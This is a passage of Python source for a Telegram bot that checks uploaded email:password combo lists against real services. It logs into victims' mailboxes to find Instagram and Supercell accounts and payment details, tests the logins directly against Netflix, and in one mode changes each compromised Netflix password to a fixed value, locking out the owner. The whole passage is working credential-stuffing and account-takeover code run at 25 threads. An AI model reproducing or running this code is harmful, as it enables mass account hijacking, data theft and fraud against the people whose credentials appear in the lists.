                                _igc = 'N/A'; _igb = 'N/A'; _igj = 'N/A'; _igver = 'N/A'; _igpriv = 'N/A'
                                _igpic = ''; _flag = '🏳️'
                            hits.append(f"{_ea}:{_pw} | Instagram ✅ | @{_igu} | Followers: {_igf:,} | Posts: {_igp} | Verified: {_igver}")
                            hit_num = len(hits)
                            _is_grp = is_allowed_group(message.chat.id) and message.chat.id != user_id
                            _tgt = user_id if _is_grp else message.chat.id
                            try:
                                bot.send_message(_tgt,
                                    f"━━━━━━━━━━━━━━━━━━━━\n"
                                    f"📸 <b>Instagram Hit #{hit_num}</b>\n"
                                    f"━━━━━━━━━━━━━━━━━━━━\n\n"
                                    f"📧 Email: <code>{_ea}</code>\n"
                                    f"👤 Pass: <code>{_pw}</code>\n\n"
                                    f"📸 <b>@{_igu}</b> ({_igname})\n"
                                    f"👥 Followers: <b>{_igf:,}</b>\n"
                                    f"👣 Following: <b>{_igfg:,}</b>\n"
                                    f"🖼️ Posts: <b>{_igp}</b>\n"
                                    f"🌍 Country: <b>{_flag} {_igc}</b>\n"
                                    f"📝 Bio: {_igb}\n"
                                    f"📅 Joined: {_igj}\n"
                                    f"✅ Verified: {_igver}\n"
                                    f"🔒 Private: {_igpriv}\n\n"
                                    f"━━━━━━━━━━━━━━━━━━━━\n"
                                    f"💎 {MY_SIGNATURE}", parse_mode='HTML')
                                if _igpic and _igpic != 'N/A':
                                    try:
                                        bot.send_photo(_tgt, _igpic, caption=f"📸 @{_igu}  |  💎 {MY_SIGNATURE}")
                                    except:
                                        pass
                            except Exception:
                                pass
                        else:
                            no_inbox.append(f"{_ea}:{_pw}")
                except Exception:
                    with lock:
                        checked[0] += 1
                        errors_list.append(f"{_ea}:{_pw} | ERROR")

            def _ig_progress():
                _last = -1
                while checked[0] < total and active_scans.get(user_id, False):
                    if checked[0] != _last:
                        _last = checked[0]
                        try:
                            bot.edit_message_text(
                                f"📸 <b>Instagram Check Running...</b>\n\n"
                                f"📊 Progress: <b>{checked[0]}/{total}</b>\n"
                                f"✅ Hits: <b>{len(hits)}</b> | ❌ Bad: <b>{len(bads)}</b> | 📭 No Match: <b>{len(no_inbox)}</b>",
                                message.chat.id, progress_msg.message_id,
                                parse_mode='HTML', reply_markup=stop_scan_keyboard(user_id))
                        except:
                            pass
        
            _ig_chat = message.chat.id; _ig_pm = progress_msg.message_id; _ig_uname = message.from_user.username or ""

            def _instagram_thread():
              try:
                threading.Thread(target=_ig_progress, daemon=True).start()
                with concurrent.futures.ThreadPoolExecutor(max_workers=25) as ex:
                    ex.map(_ig_check_one, combos)
                end_scan(user_id)
                try:
                    bot.delete_message(_ig_chat, _ig_pm)
                except:
                    pass
                cc = checked[0]
                record_inbox(user_id, username=_ig_uname, service_name="Instagram", combos_count=cc, hits=len(hits), bads=len(bads))
                _grp = is_allowed_group(_ig_chat) and _ig_chat != user_id
                bot.send_message(_ig_chat,
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"📸 <b>INSTAGRAM SCAN {'⏹ STOPPED' if cc < total else 'COMPLETED'}</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"📊 <b>Checked:</b> {cc}/{total}\n"
                    f"✅ <b>Instagram Found:</b> {len(hits)}\n"
                    f"📭 <b>Login OK, no Instagram:</b> {len(no_inbox)}\n"
                    f"❌ <b>Bad (Login Failed):</b> {len(bads)}\n"
                    f"🔄 <b>Errors/Retry:</b> {len(errors_list)}\n\n"
                    f"{'📩 <i>Hits sent to your DM!</i>' + chr(10) + chr(10) if _grp and hits else ''}"
                    f"━━━━━━━━━━━━━━━━━━━━\n💎 {MY_SIGNATURE}", parse_mode='HTML')
                _al = []
                if hits: _al += ["═══ INSTAGRAM HITS ═══"] + hits
                if no_inbox: _al += ["\n═══ LOGIN OK / NO INSTAGRAM ═══"] + no_inbox
                if bads: _al += ["\n═══ BAD (LOGIN FAILED) ═══"] + bads
                if errors_list: _al += ["\n═══ ERRORS / RETRY ═══"] + errors_list
                if _al:
                    _tgt2 = user_id if _grp else _ig_chat
                    send_large_document(_tgt2, "\n".join(_al).encode('utf-8'),
                        f"INSTAGRAM_{len(hits)}hits_{len(bads)}bad_{total}total.txt",
                        caption=f"📸 <b>Instagram Results</b>\n✅ {len(hits)} Hits | ❌ {len(bads)} Bad\n\n💎 {MY_SIGNATURE}")
              except Exception as e:
                try: bot.send_message(_ig_chat, f"❌ Error: {str(e)}")
                except: pass
              finally:
                user_sessions.pop(user_id, None)
                end_scan(user_id)

            threading.Thread(target=_instagram_thread, daemon=True).start()
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Error: {str(e)}")
        return

    # ── SUPERCELL INBOXEN MODE ──────────────────────────────────
    if doc_session.get("mode") == "inbox_supercell" and doc_session.get("step") == "waiting_combo":
        try:
            downloaded_file = _download_combo(message)
            if downloaded_file is None:
                return
            raw_lines = downloaded_file.decode('utf-8', errors='ignore').splitlines()
            combos = []
            for _ln in raw_lines:
                _ln = _ln.strip()
                if not _ln or ':' not in _ln:
                    continue
                _sp = _ln.split(':', 1)
                _ea, _pw = _sp[0].strip(), _sp[1].strip()
                if _pw and '@' in _ea and '.' in _ea.split('@')[-1]:
                    combos.append((_ea, _pw))
            total = len(combos)
            if total == 0:
                bot.send_message(message.chat.id, "❌ No valid lines found.")
                user_sessions.pop(user_id, None)
                return
            if not start_scan(user_id):
                bot.send_message(message.chat.id, "⚠️ You already have an active scan running!", parse_mode='HTML')
                return
            progress_msg = bot.send_message(
                message.chat.id,
                f"⚔️ <b>Supercell Inbox Scan Started!</b>\n\n"
                f"📥 Accounts: <b>{total}</b>\n\n⏳ Please wait...",
                parse_mode='HTML', reply_markup=stop_scan_keyboard(user_id)
            )
            hits = []; bads = []; no_inbox = []; errors_list = []
            checked = [0]; lock = threading.Lock()

            _SC_SENDERS = [
                "noreply@supercell.com", "no-reply@supercell.com",
                "noreply@id.supercell.com", "no-reply@id.supercell.com",
                "support@supercell.com", "community@supercell.com",
            ]
            _SC_GAMES = [
                ("Clash of Clans",  ["clash of clans", "clashofclans"]),
                ("Clash Royale",    ["clash royale", "clashroyale"]),
                ("Brawl Stars",     ["brawl stars", "brawlstars"]),
                ("Hay Day",         ["hay day", "hayday"]),
                ("Boom Beach",      ["boom beach", "boombeach"]),
                ("Squad Busters",   ["squad busters", "squadbusters"]),
                ("Clash Mini",      ["clash mini", "clashmini"]),
            ]

            def _sc_detect_games(text):
                tl = text.lower()
                found_g = []
                for gname, keys in _SC_GAMES:
                    if any(k in tl for k in keys):
                        found_g.append(gname)
                return found_g

            def _sc_extract_tags(text):
                return list(set(re.findall(r'#[A-Z0-9]{5,10}', text)))

            def _sc_check_one(combo):
                _ea, _pw = combo
                if not active_scans.get(user_id, False):
                    return
                try:
                    result, provider = check_account_auto(_ea, _pw)
                    if result.get("status") == "RETRY":
                        result, provider = check_account_auto(_ea, _pw)
                    status = result.get("status", "RETRY")
                    if status == "BAD":
                        with lock:
                            checked[0] += 1
                            bads.append(f"{_ea}:{_pw}")
                        return
                    if status != "HIT":
                        with lock:
                            checked[0] += 1
                            errors_list.append(f"{_ea}:{_pw} | {status}")
                        return

                    sc_found = False
                    sc_email_count = 0
                    sc_games = []
                    sc_tags = []
                    sc_payments = []
                    sc_combined = ""

                    if provider == "tonline":
                        for _sender in _SC_SENDERS:
                            _sf, _fetched = TOnlineChecker.search_and_fetch(_ea, _pw, _sender, max_count=10)
                            if _sf:
                                sc_found = True
                                sc_email_count += len(_fetched)
                                for _item in _fetched:
                                    _txt = _item.get("subject","") + " " + _item.get("body","")
                                    sc_combined += " " + _txt
                    else:
                        _token = result.get("token",""); _cid = result.get("cid","")
                        for _sender in _SC_SENDERS:
                            _texts = _hotmail_search_and_fetch(_token, _cid, f'from:"{_sender}"', 10)
                            if _texts:
                                sc_found = True
                                sc_email_count += len(_texts)
                                for _item in _texts:
                                    _txt = _item.get("subject","") + " " + _item.get("body","")
                                    sc_combined += " " + _txt

                    if sc_found and sc_combined:
                        sc_games = _sc_detect_games(sc_combined)
                        sc_tags  = _sc_extract_tags(sc_combined)
                        sc_payments = extract_payment_from_text(sc_combined.lower())

                    with lock:
                        checked[0] += 1
                        if sc_found:
                            _games_str  = ", ".join(sc_games) if sc_games else "Supercell Account"
                            _tags_str   = " | ".join(sc_tags[:5]) if sc_tags else "None"
                            _pay_str    = " | ".join(sc_payments) if sc_payments else "None"
                            hits.append(f"{_ea}:{_pw} | Supercell ⚔️ | Games: {_games_str} | Tags: {_tags_str} | Emails: {sc_email_count} | Payment: {_pay_str}")
                            hit_num = len(hits)
                            _is_grp = is_allowed_group(message.chat.id) and message.chat.id != user_id
                            _tgt = user_id if _is_grp else message.chat.id
                            _games_lines = "\n".join([f"  • {g}" for g in sc_games]) if sc_games else "  • Account found"
                            _tags_lines  = "\n".join([f"  • <code>{t}</code>" for t in sc_tags[:5]]) if sc_tags else "  • Not found"
                            try:
                                bot.send_message(_tgt,
                                    f"━━━━━━━━━━━━━━━━━━━━\n"
                                    f"⚔️ <b>Supercell Hit #{hit_num}</b>\n"
                                    f"━━━━━━━━━━━━━━━━━━━━\n\n"
                                    f"📧 Email: <code>{_ea}</code>\n"
                                    f"👤 Pass: <code>{_pw}</code>\n\n"
                                    f"⚔️ <b>Supercell Account</b>\n"
                                    f"📨 Emails Found: <b>{sc_email_count}</b>\n\n"
                                    f"🎮 <b>Games:</b>\n{_games_lines}\n\n"
                                    f"🏷️ <b>Player Tags:</b>\n{_tags_lines}\n\n"
                                    f"💳 <b>Payment:</b> {_pay_str}\n\n"
                                    f"━━━━━━━━━━━━━━━━━━━━\n"
                                    f"💎 {MY_SIGNATURE}", parse_mode='HTML')
                            except Exception:
                                pass
                        else:
                            no_inbox.append(f"{_ea}:{_pw}")
                except Exception:
                    with lock:
                        checked[0] += 1
                        errors_list.append(f"{_ea}:{_pw} | ERROR")

            def _sc_progress():
                _last = -1
                while checked[0] < total and active_scans.get(user_id, False):
                    if checked[0] != _last:
                        _last = checked[0]
                        try:
                            bot.edit_message_text(
                                f"⚔️ <b>Supercell Check Running...</b>\n\n"
                                f"📊 Progress: <b>{checked[0]}/{total}</b>\n"
                                f"✅ Hits: <b>{len(hits)}</b> | ❌ Bad: <b>{len(bads)}</b> | 📭 No Match: <b>{len(no_inbox)}</b>",
                                message.chat.id, progress_msg.message_id,
                                parse_mode='HTML', reply_markup=stop_scan_keyboard(user_id))
                        except:
                            pass
        
            _sc_chat = message.chat.id; _sc_pm = progress_msg.message_id; _sc_uname = message.from_user.username or ""

            def _supercell_thread():
              try:
                threading.Thread(target=_sc_progress, daemon=True).start()
                with concurrent.futures.ThreadPoolExecutor(max_workers=25) as ex:
                    ex.map(_sc_check_one, combos)
                end_scan(user_id)
                try:
                    bot.delete_message(_sc_chat, _sc_pm)
                except:
                    pass
                cc = checked[0]
                record_inbox(user_id, username=_sc_uname, service_name="Supercell", combos_count=cc, hits=len(hits), bads=len(bads))
                _grp = is_allowed_group(_sc_chat) and _sc_chat != user_id
                bot.send_message(_sc_chat,
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"⚔️ <b>SUPERCELL SCAN {'⏹ STOPPED' if cc < total else 'COMPLETED'}</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"📊 <b>Checked:</b> {cc}/{total}\n"
                    f"✅ <b>Supercell Found:</b> {len(hits)}\n"
                    f"📭 <b>Login OK, no Supercell:</b> {len(no_inbox)}\n"
                    f"❌ <b>Bad (Login Failed):</b> {len(bads)}\n"
                    f"🔄 <b>Errors/Retry:</b> {len(errors_list)}\n\n"
                    f"{'📩 <i>Hits sent to your DM!</i>' + chr(10) + chr(10) if _grp and hits else ''}"
                    f"━━━━━━━━━━━━━━━━━━━━\n💎 {MY_SIGNATURE}", parse_mode='HTML')
                _al = []
                if hits:     _al += ["═══ SUPERCELL HITS ═══"] + hits
                if no_inbox: _al += ["\n═══ LOGIN OK / NO SUPERCELL ═══"] + no_inbox
                if bads:     _al += ["\n═══ BAD (LOGIN FAILED) ═══"] + bads
                if errors_list: _al += ["\n═══ ERRORS / RETRY ═══"] + errors_list
                if _al:
                    _tgt2 = user_id if _grp else _sc_chat
                    send_large_document(_tgt2, "\n".join(_al).encode('utf-8'),
                        f"SUPERCELL_{len(hits)}hits_{len(bads)}bad_{total}total.txt",
                        caption=f"⚔️ <b>Supercell Results</b>\n✅ {len(hits)} Hits | ❌ {len(bads)} Bad\n\n💎 {MY_SIGNATURE}")
              except Exception as e:
                try: bot.send_message(_sc_chat, f"❌ Error: {str(e)}")
                except: pass
              finally:
                user_sessions.pop(user_id, None)
                end_scan(user_id)

            threading.Thread(target=_supercell_thread, daemon=True).start()
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Error: {str(e)}")
        return

    # ── NETFLIX DIRECT CHECKER MODE ──────────────────────────────
    if doc_session.get("mode") == "check_netflix_direct" and doc_session.get("step") == "waiting_combo":
        try:
            downloaded_file = _download_combo(message)
            if downloaded_file is None:
                return
            raw_lines = downloaded_file.decode('utf-8', errors='ignore').splitlines()
            combos = []
            for _ln in raw_lines:
                _ln = _ln.strip()
                if not _ln or ':' not in _ln:
                    continue
                _sp = _ln.split(':', 1)
                _ea, _pw = _sp[0].strip(), _sp[1].strip()
                if _pw and '@' in _ea and '.' in _ea.split('@')[-1]:
                    combos.append((_ea, _pw))
            total = len(combos)
            if total == 0:
                bot.send_message(message.chat.id, "❌ No valid lines found.")
                user_sessions.pop(user_id, None)
                return
            if not start_scan(user_id):
                bot.send_message(message.chat.id, "⚠️ You already have an active scan running!", parse_mode='HTML')
                return
            progress_msg = bot.send_message(
                message.chat.id,
                f"🎬 <b>Netflix Checker Started!</b>\n\n"
                f"📥 Accounts: <b>{total}</b>\n\n⏳ Please wait...",
                parse_mode='HTML', reply_markup=stop_scan_keyboard(user_id)
            )
            hits = []; bads = []; errors_list = []
            checked = [0]; lock = threading.Lock()

            _NF_PLAN_MAP = {
                "standard with ads": ("Standard w/ Ads", "1080p", "2"),
                "standard":          ("Standard",        "1080p", "2"),
                "premium":           ("Premium",         "4K UHD","4"),
                "basic":             ("Basic",           "480p",  "1"),
                "ultra":             ("Ultra",           "4K UHD","4"),
            }

            def _nf_check_one(combo):
                _ea, _pw = combo
                if not active_scans.get(user_id, False):
                    return
                try:
                    _sess = requests.Session()
                    _sess.headers.update({
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
                        "Accept-Language": "en-US,en;q=0.9",
                        "Accept": "application/json, text/javascript, */*; q=0.01",
                        "Origin": "https://www.netflix.com",
                        "Referer": "https://www.netflix.com/login",
                    })
                    # Step 1: get login page for cookies + authURL
                    _r0 = _sess.get("https://www.netflix.com/login", timeout=8)
                    _au = re.search(r'"authURL"\s*:\s*"([^"]+)"', _r0.text)
                    _auth_url = _au.group(1) if _au else ""

                    # Step 2: attempt login
                    _payload = {
                        "userLoginId": _ea,
                        "password": _pw,
                        "rememberMe": "true",
                        "flow": "websiteSignUp",
                        "mode": "login",
                        "action": "loginAction",
                        "withFields": "rememberMe,nextPage,userLoginId,password,countryCode,countryIsoCode",
                        "authURL": _auth_url,
                        "nextPage": "",
                        "showPassword": "",
                    }
                    _r1 = _sess.post(
                        "https://www.netflix.com/login",
                        data=_payload,
                        timeout=8,
                        allow_redirects=True
                    )

                    _page = _r1.text.lower()
                    _url  = _r1.url.lower()

                    # Determine status
                    _is_hit = (
                        "browse" in _url or
                        "profiles" in _url or
                        '"isLoggedIn":true' in _page or
                        '"currentmember":true' in _page
                    )
                    _is_bad = (
                        "incorrect password" in _page or
                        "password you entered is incorrect" in _page or
                        "we cannot find an account" in _page or
                        "email address does not exist" in _page or
                        "this email address is not registered" in _page or
                        "login" in _url and "browse" not in _url and "profiles" not in _url
                    )

                    if not _is_hit and not _is_bad:
                        with lock:
                            checked[0] += 1
                            errors_list.append(f"{_ea}:{_pw} | UNKNOWN")
                        return

                    if _is_bad:
                        with lock:
                            checked[0] += 1
                            bads.append(f"{_ea}:{_pw}")
                        return

                    # ── Parse plan / account info from page ──────────────
                    _plan_raw = "unknown"
                    _country  = "N/A"
                    _billing  = "N/A"
                    _streams  = "N/A"
                    _res      = "N/A"

                    for _pkey, (_pname, _pres, _pstr) in _NF_PLAN_MAP.items():
                        if _pkey in _page:
                            _plan_raw = _pname
                            _res      = _pres
                            _streams  = _pstr
                            break

                    _bm = re.search(r'next\s+billing\s+date[^<]{0,60}?(\w+\s+\d{1,2},?\s+\d{4})', _r1.text, re.IGNORECASE)
                    if _bm:
                        _billing = _bm.group(1).strip()

                    _cm = re.search(r'"countryOfSignup"\s*:\s*"([A-Z]{2})"', _r1.text)
                    if _cm:
                        _country = _cm.group(1)

                    with lock:
                        checked[0] += 1
                        hits.append(f"{_ea}:{_pw} | Netflix ✅ | Plan: {_plan_raw} | Country: {_country} | Billing: {_billing} | Res: {_res} | Streams: {_streams}")
                        _hit_num = len(hits)
                        _is_grp = is_allowed_group(message.chat.id) and message.chat.id != user_id
                        _tgt = user_id if _is_grp else message.chat.id
                        try:
                            bot.send_message(_tgt,
                                f"━━━━━━━━━━━━━━━━━━━━\n"
                                f"🎬 <b>Netflix Hit #{_hit_num}</b>\n"
                                f"━━━━━━━━━━━━━━━━━━━━\n\n"
                                f"📧 Email: <code>{_ea}</code>\n"
                                f"🔑 Pass: <code>{_pw}</code>\n\n"
                                f"📋 Plan: <b>{_plan_raw}</b>\n"
                                f"🌍 Country: <b>{_country}</b>\n"
                                f"📅 Billing: <b>{_billing}</b>\n"
                                f"📺 Resolution: <b>{_res}</b>\n"
                                f"👥 Streams: <b>{_streams}</b>\n\n"
                                f"━━━━━━━━━━━━━━━━━━━━\n"
                                f"💎 {MY_SIGNATURE}", parse_mode='HTML')
                        except Exception:
                            pass
                except Exception:
                    with lock:
                        checked[0] += 1
                        errors_list.append(f"{_ea}:{_pw} | ERROR")

            def _nf_progress():
                _last = -1
                while checked[0] < total and active_scans.get(user_id, False):
                    if checked[0] != _last:
                        _last = checked[0]
                        try:
                            bot.edit_message_text(
                                f"🎬 <b>Netflix Checker Running...</b>\n\n"
                                f"📊 Progress: <b>{checked[0]}/{total}</b>\n"
                                f"✅ Hits: <b>{len(hits)}</b> | ❌ Bad: <b>{len(bads)}</b>",
                                message.chat.id, progress_msg.message_id,
                                parse_mode='HTML', reply_markup=stop_scan_keyboard(user_id))
                        except:
                            pass
        
            _nf_chat = message.chat.id; _nf_pm = progress_msg.message_id; _nf_uname = message.from_user.username or ""

            def _netflix_checker_thread():
              try:
                threading.Thread(target=_nf_progress, daemon=True).start()
                with concurrent.futures.ThreadPoolExecutor(max_workers=25) as ex:
                    ex.map(_nf_check_one, combos)
                end_scan(user_id)
                try:
                    bot.delete_message(_nf_chat, _nf_pm)
                except:
                    pass
                cc = checked[0]
                record_inbox(user_id, username=_nf_uname, service_name="Netflix Checker", combos_count=cc, hits=len(hits), bads=len(bads))
                _grp = is_allowed_group(_nf_chat) and _nf_chat != user_id
                bot.send_message(_nf_chat,
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"🎬 <b>NETFLIX CHECK {'⏹ STOPPED' if cc < total else 'COMPLETED'}</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"📊 <b>Checked:</b> {cc}/{total}\n"
                    f"✅ <b>Hits:</b> {len(hits)}\n"
                    f"❌ <b>Bad:</b> {len(bads)}\n"
                    f"🔄 <b>Errors:</b> {len(errors_list)}\n\n"
                    f"{'📩 <i>Hits sent to your DM!</i>' + chr(10) + chr(10) if _grp and hits else ''}"
                    f"━━━━━━━━━━━━━━━━━━━━\n💎 {MY_SIGNATURE}", parse_mode='HTML')
                _al = []
                if hits:        _al += ["═══ NETFLIX HITS ═══"] + hits
                if bads:        _al += ["\n═══ BAD ═══"] + bads
                if errors_list: _al += ["\n═══ ERRORS ═══"] + errors_list
                if _al:
                    _tgt2 = user_id if _grp else _nf_chat
                    send_large_document(_tgt2, "\n".join(_al).encode('utf-8'),
                        f"NETFLIX_{len(hits)}hits_{len(bads)}bad_{total}total.txt",
                        caption=f"🎬 <b>Netflix Results</b>\n✅ {len(hits)} Hits | ❌ {len(bads)} Bad\n\n💎 {MY_SIGNATURE}")
              except Exception as e:
                try: bot.send_message(_nf_chat, f"❌ Error: {str(e)}")
                except: pass
              finally:
                user_sessions.pop(user_id, None)
                end_scan(user_id)

            threading.Thread(target=_netflix_checker_thread, daemon=True).start()
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Error: {str(e)}")
        return

    # ── NETFLIX PASSWORD RESET MODE ────────────────────────────────
    if doc_session.get("mode") == "netflix_pass_reset" and doc_session.get("step") == "waiting_combo":
        try:
            downloaded_file = _download_combo(message)
            if downloaded_file is None:
                return
            raw_lines = downloaded_file.decode('utf-8', errors='ignore').splitlines()
            combos = []
            for _ln in raw_lines:
                _ln = _ln.strip()
                if not _ln or ':' not in _ln:
                    continue
                _sp = _ln.split(':', 1)
                _ea, _pw = _sp[0].strip(), _sp[1].strip()
                if _pw and '@' in _ea and '.' in _ea.split('@')[-1]:
                    combos.append((_ea, _pw))
            total = len(combos)
            if total == 0:
                bot.send_message(message.chat.id, "❌ No valid lines found.")
                user_sessions.pop(user_id, None)
                return
            if not start_scan(user_id):
                bot.send_message(message.chat.id, "⚠️ You already have an active scan running!", parse_mode='HTML')
                return
            progress_msg = bot.send_message(
                message.chat.id,
                f"🔑 <b>Netflix Pass Reset Started!</b>\n\n"
                f"🔐 New Password: <code>spark_god_45</code>\n"
                f"📥 Accounts: <b>{total}</b>\n\n⏳ Please wait...",
                parse_mode='HTML', reply_markup=stop_scan_keyboard(user_id)
            )
            NEW_PASS = "spark_god_45"
            hits = []; bads = []; errors_list = []
            checked = [0]; lock = threading.Lock()
            _nfr_chat = message.chat.id; _nfr_pm = progress_msg.message_id
            _nfr_uname = message.from_user.username or ""

            def _nfr_check_one(combo):
                _ea, _pw = combo
                if not active_scans.get(user_id, False):
                    return
                try:
                    _sess = requests.Session()
                    _sess.headers.update({
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
                        "Accept-Language": "en-US,en;q=0.9",
                        "Accept": "application/json, text/javascript, */*; q=0.01",
                        "Origin": "https://www.netflix.com",
                        "Referer": "https://www.netflix.com/login",
                    })
                    _r0 = _sess.get("https://www.netflix.com/login", timeout=8)
                    _au = re.search(r'"authURL"\s*:\s*"([^"]+)"', _r0.text)
                    _auth_url = _au.group(1) if _au else ""
                    _payload = {
                        "userLoginId": _ea, "password": _pw, "rememberMe": "true",
                        "flow": "websiteSignUp", "mode": "login", "action": "loginAction",
                        "withFields": "rememberMe,nextPage,userLoginId,password,countryCode,countryIsoCode",
                        "authURL": _auth_url, "nextPage": "", "showPassword": "",
                    }
                    _r1 = _sess.post("https://www.netflix.com/login", data=_payload, timeout=8, allow_redirects=True)
                    _page = _r1.text.lower()
                    _url  = _r1.url.lower()
                    _is_hit = "browse" in _url or "profiles" in _url or '"isloggedin":true' in _page or '"currentmember":true' in _page
                    _is_bad = ("incorrect password" in _page or "we cannot find" in _page or
                               "not registered" in _page or "does not exist" in _page or
                               ("login" in _url and "browse" not in _url and "profiles" not in _url))
                    if _is_bad:
                        with lock:
                            checked[0] += 1
                            bads.append(f"{_ea}:{_pw} | BAD CREDENTIALS")
                        return
                    if not _is_hit:
                        with lock:
                            checked[0] += 1
                            errors_list.append(f"{_ea}:{_pw} | LOGIN FAILED / UNKNOWN")
                        return
                    # Get account page for build_id + fresh authURL
                    _r2 = _sess.get("https://www.netflix.com/YourAccount", timeout=8)
                    _bid_m = re.search(r'"BUILD_IDENTIFIER"\s*:\s*"([^"]+)"', _r2.text)
                    _build_id = _bid_m.group(1) if _bid_m else ""
                    _au2 = re.search(r'"authURL"\s*:\s*"([^"]+)"', _r2.text)
                    _auth2 = _au2.group(1) if _au2 else _auth_url
                    if not _build_id:
                        with lock:
                            checked[0] += 1
                            errors_list.append(f"{_ea}:{_pw} | LOGGED IN BUT NO BUILD ID")
                        return
                    # Change password
                    _chg_url = f"https://www.netflix.com/api/shakti/{_build_id}/account/changePassword"
                    _sess.headers.update({"Content-Type": "application/x-www-form-urlencoded"})
                    _chg_payload = {
                        "currentPassword": _pw, "newPassword": NEW_PASS,
                        "confirmNewPassword": NEW_PASS, "authURL": _auth2,
                    }
                    _r3 = _sess.post(_chg_url, data=_chg_payload, timeout=8)
                    _chg_data = {}
                    try: _chg_data = _r3.json()
                    except: pass
                    _reset_ok = (_r3.status_code == 200 and
                                 "error" not in str(_chg_data).lower() and
                                 "incorrect" not in str(_chg_data).lower())
                    with lock:
                        checked[0] += 1
                        if _reset_ok:
                            hits.append(f"{_ea}:{NEW_PASS} | RESET ✅ | Old: {_pw}")
                            _hit_num = len(hits)
                            _is_grp = is_allowed_group(message.chat.id) and message.chat.id != user_id
                            _tgt = user_id if _is_grp else message.chat.id
                            try:
                                bot.send_message(_tgt,
                                    f"━━━━━━━━━━━━━━━━━━━━\n"
                                    f"🔑 <b>Netflix Reset Hit #{_hit_num}</b>\n"
                                    f"━━━━━━━━━━━━━━━━━━━━\n\n"
                                    f"📧 Email: <code>{_ea}</code>\n"
                                    f"🔑 New Pass: <code>{NEW_PASS}</code>\n"
                                    f"🔓 Old Pass: <code>{_pw}</code>\n\n"
                                    f"━━━━━━━━━━━━━━━━━━━━\n"
                                    f"💎 {MY_SIGNATURE}", parse_mode='HTML')
                            except: pass
                        else:
                            errors_list.append(f"{_ea}:{_pw} | RESET FAILED | Status: {_r3.status_code}")
                except Exception:
                    with lock:
                        checked[0] += 1
                        errors_list.append(f"{_ea}:{_pw} | ERROR")

            def _nfr_progress():
                _last = -1
                while checked[0] < total and active_scans.get(user_id, False):
                    if checked[0] != _last:
                        _last = checked[0]
                        try:
                            bot.edit_message_text(
                                f"🔑 <b>Netflix Pass Reset Running...</b>\n\n"
                                f"📊 Progress: <b>{checked[0]}/{total}</b>\n"
                                f"✅ Resets: <b>{len(hits)}</b> | ❌ Bad: <b>{len(bads)}</b> | ⚠️ Failed: <b>{len(errors_list)}</b>",
                                _nfr_chat, _nfr_pm,
                                parse_mode='HTML', reply_markup=stop_scan_keyboard(user_id))
                        except: pass

            def _nfr_thread():
              try:
                threading.Thread(target=_nfr_progress, daemon=True).start()
                with concurrent.futures.ThreadPoolExecutor(max_workers=25) as ex:
                    ex.map(_nfr_check_one, combos)
                end_scan(user_id)
                try: bot.delete_message(_nfr_chat, _nfr_pm)
                except: pass
                cc = checked[0]
                record_inbox(user_id, username=_nfr_uname, service_name="Netflix Pass Reset", combos_count=cc, hits=len(hits), bads=len(bads))
                _grp = is_allowed_group(_nfr_chat) and _nfr_chat != user_id
                bot.send_message(_nfr_chat,
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"🔑 <b>NETFLIX PASS RESET {'⏹ STOPPED' if cc < total else 'COMPLETED'}</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"📊 <b>Checked:</b> {cc}/{total}\n"
                    f"✅ <b>Resets OK:</b> {len(hits)}\n"
                    f"❌ <b>Bad Creds:</b> {len(bads)}\n"
                    f"⚠️ <b>Failed:</b> {len(errors_list)}\n\n"
                    f"🔐 New Password: <code>spark_god_45</code>\n\n"
                    f"{'📩 <i>Hits sent to your DM!</i>' + chr(10) + chr(10) if _grp and hits else ''}"
                    f"━━━━━━━━━━━━━━━━━━━━\n💎 {MY_SIGNATURE}", parse_mode='HTML')
                _al = []
                if hits:        _al += ["═══ RESET HITS ═══"] + hits
                if bads:        _al += ["\n═══ BAD CREDENTIALS ═══"] + bads
                if errors_list: _al += ["\n═══ FAILED / ERRORS ═══"] + errors_list
                if _al:
                    _tgt2 = user_id if _grp else _nfr_chat
                    send_large_document(_tgt2, "\n".join(_al).encode('utf-8'),
                        f"NETFLIX_RESET_{len(hits)}hits_{len(bads)}bad_{total}total.txt",
                        caption=f"🔑 <b>Netflix Reset Results</b>\n✅ {len(hits)} Resets | ❌ {len(bads)} Bad\n\n💎 {MY_SIGNATURE}")
              except Exception as e:
                try: bot.send_message(_nfr_chat, f"❌ Error: {str(e)}")
                except: pass
              finally:
                user_sessions.pop(user_id, None)
                end_scan(user_id)

            threading.Thread(target=_nfr_thread, daemon=True).start()
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Error: {str(e)}")
        return

    # ── SPOTIFY PREMIUM INBOX MODE ────────────────────────────────
    if doc_session.get("mode") == "inbox_spotify_premium" and doc_session.get("step") == "waiting_combo":
        try:
            downloaded_file = _download_combo(message)
            if downloaded_file is None:
                return
            raw_lines = downloaded_file.decode('utf-8', errors='ignore').splitlines()
            combos = []
            for _ln in raw_lines:
                _ln = _ln.strip()
                if not _ln or ':' not in _ln:
                    continue
                _sp = _ln.split(':', 1)
                _ea, _pw = _sp[0].strip(), _sp[1].strip()
                if _pw and '@' in _ea and '.' in _ea.split('@')[-1]:
                    combos.append((_ea, _pw))
            total = len(combos)
            if total == 0:
                bot.send_message(message.chat.id, "❌ No valid lines found.")
                user_sessions.pop(user_id, None)
                return
            if not start_scan(user_id):
                bot.send_message(message.chat.id, "⚠️ You already have an active scan running!", parse_mode='HTML')
                return
            progress_msg = bot.send_message(
                message.chat.id,
                f"🎵 <b>Spotify Premium Inbox Started!</b>\n\n"
                f"📬 Sender: <code>no-reply@spotify.com</code>\n"
                f"📥 Accounts: <b>{total}</b>\n\n"
                f"⚠️ Only Premium accounts will be reported!\n\n⏳ Please wait...",
